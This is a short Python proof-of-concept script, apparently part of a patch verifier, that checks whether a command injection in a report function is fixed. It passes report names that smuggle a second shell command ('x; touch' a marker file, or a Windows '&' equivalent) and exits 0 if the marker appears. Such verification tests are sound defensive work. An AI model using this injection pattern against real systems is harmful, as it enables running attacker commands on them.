"""
poc.py — proof of concept for the command injection in app.run_report.

Convention used by the patch verifier:
    exit 0  -> vulnerability REPRODUCED (the injection ran)
    exit 1  -> vulnerability NOT reproduced (the injection was blocked)

The PoC asks run_report to process a name containing a shell metacharacter
sequence that writes a marker file. If the marker appears, the injected
command executed and the vulnerability is present.
"""

import os
import sys
import tempfile

sys.path.insert(0, os.path.dirname(__file__) + "/..")

from app import run_report


def main() -> int:
    with tempfile.TemporaryDirectory() as d:
        marker = os.path.join(d, "pwned")
        py = sys.executable.replace("\\", "\\\\")
        if os.name == "nt":
            payload = f"x & {py} -c \"open(r'{marker}', 'w').write('1')\""
        else:
            payload = f"x; touch {marker}"
        run_report(payload)
        if os.path.exists(marker):
            print("REPRODUCED: injected command executed (marker created)")
            return 0
        print("BLOCKED: injection did not execute")
        return 1


if __name__ == "__main__":
    sys.exit(main())
